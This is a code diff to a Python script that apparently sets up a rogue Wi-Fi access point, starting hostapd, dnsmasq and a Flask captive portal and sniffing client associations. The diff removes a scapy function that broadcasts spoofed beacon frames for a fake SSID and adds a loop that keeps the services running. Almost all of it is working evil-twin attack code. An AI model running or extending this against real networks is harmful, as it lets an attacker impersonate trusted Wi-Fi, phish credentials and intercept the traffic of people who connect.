@@ -70,39 +70,13 @@ def start_hostapd():
 
 def start_flask_server():
     print("[*] Starting Flask captive portal...")
-    return subprocess.Popen(
-        ["python3", "web_server/server.py"],
-        stdout=subprocess.PIPE,
-        stderr=subprocess.PIPE
-    )
+    return subprocess.Popen(["python3", "web_server/server.py"])
 
 def start_dnsmasq():
     print("[*] Starting dnsmasq...")
     return subprocess.Popen(["dnsmasq", "-C", "dnsmasq.conf", "-d"])
 
 # === SPOOFING LOGIC ===
-def send_beacons():
-    dot11 = Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff", addr2=bssid, addr3=bssid)
-    beacon = Dot11Beacon(cap="ESS")
-    essid = Dot11Elt(ID="SSID", info=ssid)
-    rsn = Dot11Elt(ID=48, info=(
-        '\x01\x00'
-        '\x00\x0f\xac\x02'
-        '\x02\x00'
-        '\x00\x0f\xac\x04'
-        '\x00\x0f\xac\x02'
-        '\x00\x00'
-    ))
-    frame = RadioTap()/dot11/beacon/essid/rsn
-
-    print(f"[+] Broadcasting fake SSID '{ssid}' on {iface}")
-    try:
-        while True:
-            sendp(frame, iface=iface, inter=0.1, loop=0, verbose=0)
-            time.sleep(0.1)
-    except KeyboardInterrupt:
-        print("\n[!] Stopped beaconing.")
-
 def sniff_associations():
     seen = set()
     def handler(pkt):
@@ -134,10 +108,14 @@ hostapd_proc = start_hostapd()
 flask_proc = start_flask_server()
 dns_proc = start_dnsmasq()
 
+# Keep the script alive to ensure services keep running
+try:
+    while True:
+        time.sleep(1)
+except KeyboardInterrupt:
+    cleanup(None, None)
+
 # # Run sniffer in background
 # sniff_thread = Thread(target=sniff_associations)
 # sniff_thread.daemon = True
 # sniff_thread.start()
-
-# # Start beacon broadcast loop
-# send_beacons()
